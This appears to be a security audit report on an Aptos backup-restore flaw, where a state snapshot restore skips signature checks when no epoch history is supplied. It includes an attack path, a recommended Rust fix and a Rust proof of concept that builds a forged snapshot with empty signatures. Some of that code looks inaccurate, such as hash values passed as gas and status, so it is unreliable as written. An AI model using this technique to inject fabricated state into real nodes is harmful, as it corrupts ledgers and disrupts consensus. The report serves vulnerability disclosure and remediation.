# Audit Report

## Title
Missing Signature Validation in State Snapshot Restore Enables Acceptance of Fabricated Future State Snapshots

## Summary
The state snapshot restoration process fails to validate `LedgerInfoWithSignatures` signatures when `epoch_history` is `None`, allowing an attacker to create and restore state snapshots with arbitrary future versions and fabricated state data. This enables database corruption and potential consensus disruption.

## Finding Description

The `StateSnapshotRestoreController` in the backup/restore system has a critical validation gap that breaks the **State Consistency** invariant. The vulnerability exists in the conditional validation logic: [1](#0-0) 

When `epoch_history` is `None`, the code skips all signature validation on the `LedgerInfoWithSignatures`. This occurs in legitimate operational scenarios, such as one-off state snapshot restores: [2](#0-1) 

The only validations performed are: [3](#0-2) 

These checks only verify internal consistency (accumulator proof correctness and root hash matching), but do NOT validate:
1. Whether the signatures on `LedgerInfoWithSignatures` are valid
2. Whether the version actually occurred in the real blockchain
3. Whether the epoch and validator set are legitimate

The `verify_transaction_info` function only checks version ordering, not authenticity: [4](#0-3) 

Even when `epoch_history` is provided, if the epoch is too new, validation is bypassed with only a warning: [5](#0-4) 

**Attack Path:**

1. Attacker crafts a malicious `StateSnapshotBackup` with:
   - `version`: Future version (e.g., 10000000 when current is 100000)
   - `epoch`: Arbitrary epoch number
   - `root_hash`: Attacker-controlled state root
   - `chunks`: Malicious state data
   - `proof`: Self-consistent but fabricated `(TransactionInfoWithProof, LedgerInfoWithSignatures)` with invalid/empty signatures

2. Attacker provides this backup to a victim node operator (via compromised backup storage, social engineering, or supply chain attack)

3. Operator runs one-off state snapshot restore (common for bootstrapping new validators or disaster recovery)

4. System loads and validates the backup but skips signature verification because `epoch_history` is `None`

5. Malicious state is written to database: [6](#0-5) 

6. Node now has corrupted state at a fabricated future version

## Impact Explanation

**Critical Severity** - This vulnerability enables:

1. **Database Corruption**: Attacker can inject arbitrary state into validator databases, violating the State Consistency invariant
2. **Consensus Disruption**: Nodes with corrupted state will fail to participate correctly in consensus, potentially causing safety violations or network partitions
3. **State Manipulation**: Attacker can fabricate account balances, module code, or governance state at future versions
4. **Denial of Service**: Corrupted nodes may fail to start or crash during normal operation when attempting to use the invalid state

The warning comment acknowledges this risk but treats it as acceptable: [7](#0-6) 

However, preventing node startup is insufficient - the attacker has already achieved database corruption, requiring manual intervention and potentially a hard fork if widespread.

## Likelihood Explanation

**High Likelihood** - The vulnerability is easily exploitable because:

1. One-off state snapshot restore with `epoch_history=None` is a **documented, legitimate operation** used by node operators
2. No special privileges required - attacker only needs to provide a malicious backup file
3. The attack is deterministic - crafting self-consistent proofs is straightforward
4. Backup storage is often a high-value attack target (S3 buckets, shared storage)
5. Social engineering of node operators is feasible ("here's the latest snapshot to speed up your sync")

## Recommendation

Add mandatory signature validation for all state snapshot restores. The system should:

1. **Always require valid signatures** - Never skip `verify_signatures()` regardless of `epoch_history` availability
2. **Require trusted waypoints** - Mandate at least one trusted waypoint for validation
3. **Fail closed** - Reject snapshots that cannot be cryptographically verified

**Code Fix:**

In `StateSnapshotRestoreController::run_impl`, replace conditional validation with mandatory validation:

```rust
// Load and verify proof
let (txn_info_with_proof, li): (TransactionInfoWithProof, LedgerInfoWithSignatures) =
    self.storage.load_bcs_file(&manifest.proof).await?;
txn_info_with_proof.verify(li.ledger_info(), manifest.version)?;

// CRITICAL: Always verify signatures - never skip this check
if let Some(epoch_history) = self.epoch_history.as_ref() {
    epoch_history.verify_ledger_info(&li)?;
} else {
    // Without epoch history, we cannot verify signatures safely
    // Reject the restore to prevent database corruption
    bail!(
        "State snapshot restore requires epoch history for signature verification. \
         Version: {}, Epoch: {}. Use --epoch-ending-manifest to provide epoch history.",
        manifest.version,
        manifest.epoch
    );
}
```

Additionally, fix `EpochHistory::verify_ledger_info` to reject (not warn) on too-new epochs:

```rust
if epoch > self.epoch_endings.len() as u64 {
    bail!(
        "Epoch {} is newer than epoch history (until epoch {}). \
         Cannot verify signatures without validator set information.",
        epoch,
        self.epoch_endings.len()
    );
}
```

## Proof of Concept

```rust
// Proof of Concept: Create malicious StateSnapshotBackup
use aptos_types::{
    ledger_info::{LedgerInfo, LedgerInfoWithSignatures},
    proof::TransactionInfoWithProof,
    transaction::{TransactionInfo, Version},
};
use aptos_crypto::HashValue;

fn create_malicious_backup() -> (StateSnapshotBackup, Vec<u8>) {
    // Step 1: Create fabricated future version
    let malicious_version: Version = 10_000_000; // Far future
    let malicious_epoch = 1000u64;
    let malicious_root = HashValue::random();
    
    // Step 2: Create self-consistent but fake TransactionInfo
    let fake_txn_info = TransactionInfo::new(
        malicious_root, // state_checkpoint_hash
        HashValue::zero(), // event_root_hash
        HashValue::zero(), // gas_used
        HashValue::zero(), // status
    );
    
    // Step 3: Build fake accumulator with single transaction
    let mut accumulator = InMemoryTransactionAccumulator::new_empty();
    accumulator = accumulator.append(&[fake_txn_info.hash()]);
    
    // Step 4: Create fake LedgerInfo (NO VALID SIGNATURES!)
    let fake_ledger_info = LedgerInfo::new(
        /* block_info */ BlockInfo::new(
            malicious_epoch,
            /* round */ 0,
            /* id */ HashValue::zero(),
            accumulator.root_hash(),
            malicious_version,
            /* timestamp_usecs */ 0,
            None,
        ),
        HashValue::zero(),
    );
    
    // Step 5: Create LedgerInfoWithSignatures with EMPTY signatures
    // This will pass validation when epoch_history is None!
    let fake_li_with_sigs = LedgerInfoWithSignatures::new(
        fake_ledger_info,
        BTreeMap::new(), // EMPTY SIGNATURES - CRITICAL!
    );
    
    // Step 6: Create proof combining them
    let fake_proof = (
        TransactionInfoWithProof::new(
            TransactionAccumulatorProof::new(vec![]), // Self-consistent
            fake_txn_info,
        ),
        fake_li_with_sigs,
    );
    
    let proof_bytes = bcs::to_bytes(&fake_proof).unwrap();
    
    // Step 7: Create malicious StateSnapshotBackup
    let malicious_backup = StateSnapshotBackup {
        version: malicious_version,
        epoch: malicious_epoch,
        root_hash: malicious_root,
        chunks: vec![], // Attacker can add malicious state here
        proof: FileHandle::new(/* proof file location */),
    };
    
    (malicious_backup, proof_bytes)
}

// When restored with epoch_history=None, this will be ACCEPTED
// because signatures are never checked!
```

**Notes:**

The TODO comment at line 280 acknowledges this needs fixing but the vulnerability remains exploitable. The warning message explicitly states "node won't be able to start if this data is malicious," treating database corruption as acceptable as long as startup fails - this is insufficient protection against this critical vulnerability.

### Citations

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/restore.rs (L127-136)
```rust
        txn_info_with_proof.verify(li.ledger_info(), manifest.version)?;
        let state_root_hash = txn_info_with_proof
            .transaction_info()
            .ensure_state_checkpoint_hash()?;
        ensure!(
            state_root_hash == manifest.root_hash,
            "Root hash mismatch with that in proof. root hash: {}, expected: {}",
            manifest.root_hash,
            state_root_hash,
        );
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/restore.rs (L137-139)
```rust
        if let Some(epoch_history) = self.epoch_history.as_ref() {
            epoch_history.verify_ledger_info(&li)?;
        }
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/restore.rs (L212-215)
```rust
            tokio::task::spawn_blocking(move || {
                receiver.lock().as_mut().unwrap().add_chunk(blobs, proof)
            })
            .await??;
```

**File:** storage/db-tool/src/restore.rs (L88-95)
```rust
                        StateSnapshotRestoreController::new(
                            opt,
                            global.try_into()?,
                            storage.init_storage().await?,
                            None, /* epoch_history */
                        )
                        .run()
                        .await?;
```

**File:** types/src/proof/mod.rs (L46-51)
```rust
    ensure!(
        transaction_version <= ledger_info.version(),
        "Transaction version {} is newer than LedgerInfo version {}.",
        transaction_version,
        ledger_info.version(),
    );
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L279-288)
```rust
        if epoch > self.epoch_endings.len() as u64 {
            // TODO(aldenhu): fix this from upper level
            warn!(
                epoch = epoch,
                epoch_history_until = self.epoch_endings.len(),
                "Epoch is too new and can't be verified. Previous chunks are verified and node \
                won't be able to start if this data is malicious."
            );
            return Ok(());
        }
```
